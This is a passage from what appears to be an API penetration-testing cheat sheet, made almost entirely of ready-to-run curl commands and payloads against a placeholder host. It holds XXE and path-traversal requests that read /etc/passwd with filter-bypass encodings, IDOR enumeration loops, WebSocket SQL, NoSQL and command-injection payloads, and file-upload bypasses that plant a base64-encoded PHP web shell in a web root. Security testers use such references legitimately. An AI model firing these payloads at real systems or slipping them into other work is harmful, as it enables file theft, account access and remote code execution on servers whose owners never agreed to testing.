  --data-binary '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="10" y="20">&xxe;</text></svg>'
```

---

## 21. Path Traversal

```bash
# Basic
curl -s "https://api.target.com/api/files/download?path=../../../etc/passwd"
curl -s "https://api.target.com/api/files/download?path=..%2f..%2f..%2fetc%2fpasswd"
curl -s "https://api.target.com/api/files/download?path=..\\..\\..\\windows\\win.ini"
curl -s "https://api.target.com/api/files/download?path=/etc/passwd"

# POST body
curl -s -X POST "https://api.target.com/api/files/read" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"path":"../../../etc/passwd"}'
curl -s -X POST "https://api.target.com/api/files/read" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"filename":"../../../etc/passwd"}'

# Bypass
curl -s "https://api.target.com/api/files/download?path=%252e%252e%252fetc%252fpasswd"  # double encoding
curl -s "https://api.target.com/api/files/download?path=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"  # unicode
curl -s "https://api.target.com/api/files/download?path=../../../../../../../../../../../../etc/passwd"  # deep
curl -s "https://api.target.com/api/files/download?path=....//....//....//etc/passwd"  # nested
curl -s "https://api.target.com/api/files/download?path=../../../etc/passwd%00.jpg"  # null byte
curl -s "https://api.target.com/api/files/download?path=..;/..;/..;/etc/passwd"  # filter bypass
```

---

## 22. Insecure Direct Object References Advanced

```bash
# Sequential and GUID manipulation
for id in $(seq 1 100); do curl -s "https://api.target.com/api/documents/$id" -H "Authorization: Bearer $TOKEN" -w "\n$id: %{http_code}\n"; done
curl -s "https://api.target.com/api/users/$(echo -n '1' | base64)" -H "Authorization: Bearer $TOKEN"
curl -s "https://api.target.com/api/users/$(echo -n 'admin' | base64)" -H "Authorization: Bearer $TOKEN"

# Filter/search bypass
curl -s "https://api.target.com/api/orders?search=user_id:1" -H "Authorization: Bearer $TOKEN"
curl -s "https://api.target.com/api/orders?filter=all&include_deleted=true&show_all=true" -H "Authorization: Bearer $TOKEN"

# Batch operations
curl -s -X POST "https://api.target.com/api/batch" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"requests":[{"method":"GET","path":"/api/users/1"},{"method":"GET","path":"/api/users/2"},{"method":"GET","path":"/api/admin/config"}]}'

# Mass enumeration
for r in users orders documents invoices payments profiles messages notifications logs audit api-keys; do
  for id in 1 2 3 10 100 1000; do
    curl -s "https://api.target.com/api/$r/$id" -H "Authorization: Bearer $TOKEN" -w "\n$r/$id: %{http_code}\n"
  done
done
```

---

## 23. API Key Leakage

```bash
curl -s "https://api.target.com/api/users?api_key=sk_test_123456789"
curl -s "https://api.target.com/api/users?key=AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz"
curl -s "https://api.target.com/api/users/1" -H "Authorization: Bearer $TOKEN" | grep -iE "(api[_-]?key|secret|token|password|sk_live|sk_test|AIza|ghp_)"

for f in api_key apiKey secret secret_key token access_token refresh_token client_secret stripe_key aws_key gcp_key; do
  curl -s "https://api.target.com/api/users/1" -H "Authorization: Bearer $TOKEN" | jq ".$f" 2>/dev/null | grep -v null
done
```

---

## 24. WebSocket API Testing

```bash
wscat -c wss://api.target.com/ws
wscat -c wss://api.target.com/ws -H "Authorization: Bearer $TOKEN"
wscat -c ws://api.target.com/ws  # unencrypted
```

```python
import asyncio, websockets
async def t():
    async with websockets.connect('wss://api.target.com/ws', extra_headers={'Authorization':'Bearer TOKEN'}) as ws:
        for m in ['{"event":"join","data":{"room":"admin"}}', '{"event":"message","data":{"text":"<script>alert(1)</script>"}}', '{"event":"auth","data":{"role":"admin"}}', '{"event":"get","data":{"userId":1}}']:
            await ws.send(m); print(await ws.recv())
asyncio.run(t())
```

```
# IDOR: {"event":"subscribe","data":{"userId":5,"channel":"notifications"}}
# SQLi: {"event":"search","data":{"query":"' OR 1=1--"}}
# NoSQL: {"event":"search","data":{"query":{"$ne":""}}}
# RCE: {"event":"exec","data":{"cmd":"id"}}
```

---

## 25. File Upload via API

```bash
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@webshell.php"
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@image.png;filename=webshell.php"
curl -s -X POST "https://api.target.com/api/upload" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"filename":"shell.php","content":"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+","content_type":"image/png"}'

# Extension bypass
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@shell.php.jpg"
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@shell.php5"
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@shell.php%00.jpg"
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@shell.php."

# SVG XSS
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@-;filename=x.svg" << 'EOF'
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><script>alert(document.cookie)</script></svg>
EOF

# Path traversal + Content-Type bypass
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@test.txt;filename=../../../var/www/html/shell.php"
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" -H "Content-Type: image/jpeg" --data-binary @webshell.php
curl -s -X POST "https://api.target.com/api/upload" -H "Authorization: Bearer $TOKEN" --data-binary $'\x89PNG\r\n\x1a\n'$(cat webshell.php) -H "Content-Type: image/png"
```

---

## End of API Testing Rules

### Checklist Summary

```
[ ] Authentication tested on every endpoint
[ ] IDOR tested on all CRUD operations
[ ] Rate limit bypass attempted
[ ] CORS configuration verified
[ ] GraphQL introspection checked
[ ] Mass assignment tested
[ ] HTTP method override tested
[ ] Content-type switching tested
[ ] Version diffing v1 vs v2
[ ] Parameter fuzzing completed
[ ] Error analysis complete
[ ] JWT token manipulation tested
[ ] SSRF on URL parameters
[ ] SQL injection on all inputs
[ ] NoSQL injection on JSON endpoints
[ ] XXE on XML content types
[ ] Path traversal on file endpoints
[ ] File upload bypass tested
[ ] WebSocket security verified
[ ] API documentation discovered
```

---

### curl Reference Quick Guide

```
# GET with auth
curl -s "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# POST / PUT / PATCH / DELETE
curl -s -X POST "https://api.target.com/api/resource" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"key":"value"}'
curl -s -X DELETE "https://api.target.com/api/resource/1" -H "Authorization: Bearer $TOKEN"

# Status code only
curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# Response headers
curl -s -D - "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"

# CORS preflight
curl -s -X OPTIONS "https://api.target.com/api/resource" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: DELETE"

# Follow redirects / Proxy / Ignore SSL / Timeout
curl -s -L "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"
curl -s -x http://127.0.0.1:8080 "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"
curl -s -k "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"
curl -s --connect-timeout 5 --max-time 10 "https://api.target.com/api/resource" -H "Authorization: Bearer $TOKEN"
```
